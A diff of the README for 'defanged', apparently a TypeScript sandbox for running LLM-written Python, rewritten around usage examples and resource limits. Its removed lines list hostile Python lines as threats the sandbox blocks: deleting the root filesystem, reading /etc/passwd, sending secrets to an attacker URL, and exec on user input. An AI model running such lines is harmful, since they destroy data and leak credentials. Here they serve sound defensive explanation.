@@ -4,29 +4,70 @@
 
 # defanged
 
-**A sandboxed Python interpreter written in TypeScript.** Safely run Python code emitted by LLMs and agents — no filesystem access, no network access, no escape to the host process, and inject your own functions.
+Run Python written by an LLM inside your Node or Bun app. It cannot touch your disk, your network or your process, because those parts were never built.
 
+```typescript
+import { runPython } from "defanged";
+
+await runPython(`sum(x * x for x in range(10))`); // 285
+```
+
+The only way out of the sandbox is a function you hand in. No tool, no exit.
+
+[![npm](https://img.shields.io/npm/v/defanged.svg)](https://www.npmjs.com/package/defanged)
 [![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![typescript](https://img.shields.io/badge/typescript-5.x-blue.svg)](https://www.typescriptlang.org/)
 
-> **de·fang** _(verb)_ — to render harmless while keeping analyzable. In security tooling, to "defang" a payload is to strip its ability to execute dangerously while preserving its shape. This project does the same to Python.
+## What it is for
 
----
+**Agents that calculate instead of guess.** Ask "what was churn last quarter" and let the model write the arithmetic. Your data goes in through a tool; the model never gets a shell.
 
-## Why defanged?
+```typescript
+await runPython(
+  `
+customers = fetch_customers(quarter="2026-Q1")
+lost = [c for c in customers if c["churned"]]
+f"{len(lost) / len(customers):.1%} churn ({len(lost)} of {len(customers)})"
+  `,
+  [{ name: "fetch_customers", handler: ({ quarter }) => db.customers.forQuarter(quarter) }],
+); // "4.2% churn (17 of 405)"
+```
 
-LLMs love writing Python. It's the lingua franca of data work, scripting, and most agent toolchains. But handing an agent a real Python runtime is a liability:
+**Dashboards from a sentence.** The model groups, sorts and formats; you render. `print_table` and `print_chart` hand the result to your UI as plain objects.
 
-- `import os; os.system("rm -rf /")` — full shell access
-- `open("/etc/passwd").read()` — arbitrary filesystem reads
-- `import requests; requests.get(attacker_url, data=secrets)` — data exfiltration
-- `exec(user_input)` — arbitrary code execution
+```typescript
+const interpreter = createInterpreter({
+  tools: [{ name: "fetch_orders", handler: () => orders }],
+  onTable: (t) => ui.renderTable(t),
+  onChart: (c) => ui.renderChart(c),
+});
+await interpreter.run(`
+by_month = {}
+for o in fetch_orders():
+    by_month[o["date"][:7]] = by_month.get(o["date"][:7], 0) + o["total"]
+rows = [{"month": m, "revenue": round(v, 2)} for m, v in sorted(by_month.items())]
+print_chart("bar", rows, x="month", y="revenue", title="Revenue by month")
+`);
+```
 
-`defanged` executes Python without any of this. There is no filesystem, no network, no `exec`/`eval`, no `subprocess`, and `import` only reaches four built-in pure-computation modules, because **nothing else exists in the interpreter**. You cannot disable a feature that was never implemented.
+**User-defined rules in your product.** Let customers write a pricing rule or an alert condition in Python instead of inventing a formula language. Cap the damage a bad script can do with a step budget and a deadline.
 
-The only I/O channel is **tools you explicitly inject from TypeScript**. If you don't provide a tool, the Python code cannot call it.
+```typescript
+const rules = createInterpreter({
+  tools: [{ name: "order", handler: () => order }],
+  maxIterations: 10_000,
+  timeoutMs: 50,
+});
+await rules.run(`
+o = order()
+discount = 0.15 if o["total"] > 500 and o["country"] == "NL" else 0
+round(o["total"] * (1 - discount), 2)
+`); // 510
+```
 
----
+**Cleaning up tool output.** APIs return messy JSON; the model reshapes it with the Python it already knows (`datetime`, `re`, `collections`, `statistics`) and you get a JS object back.
+
+Runaway code hits a catchable limit, not your server: loops and calls are budgeted, strings and lists are capped, and recursion stops at 1,000 frames.
 
 ## Install
 
@@ -183,7 +224,9 @@ One-shot execution. Returns the value of the last expression, or `None` if the c
 Long-lived interpreter. Options:
 
 - `tools: ToolDefinition[]` — functions callable from Python
-- `onPrint: (msg: string) => void` — called for every `print()` invocation
+- `onPrint: (msg: string) => void` — called for every `print()` invocation. Without it, `print()` raises, so the model is told to use the two below instead
+- `onTable: (t: { data, columns, title? }) => void` — receives `print_table(data, columns, title=)` calls: `data` is a list of dicts as plain objects, `columns` is `[{ key, label, format? }]`
+- `onChart: (c: { type, data, x, y, title? }) => void` — receives `print_chart(type, data, x, y, title=)` calls; `type` is `bar`, `line`, `pie` or `area`, `y` a key or list of keys
 - `maxIterations: number` — budget for loop iterations, and separately for function calls, per `run()` (default 5,000,000 each). The call budget is what stops recursion that never loops, such as `fib(60)`
 - `timeoutMs: number` — wall-clock deadline per `run()`, including time spent inside awaited tool handlers (which `maxIterations` cannot bound). Raises a `TimeoutError` that Python code cannot catch. Default: no limit — set one if your host runs on an event loop it can't block indefinitely.
 - `limits: { maxStringLength?, maxCollectionSize? }` — allocation caps (defaults: 10,000,000 characters / elements). Exceeding one raises a Python-catchable `MemoryError` instead of OOMing the host. Pass `Infinity` to disable.
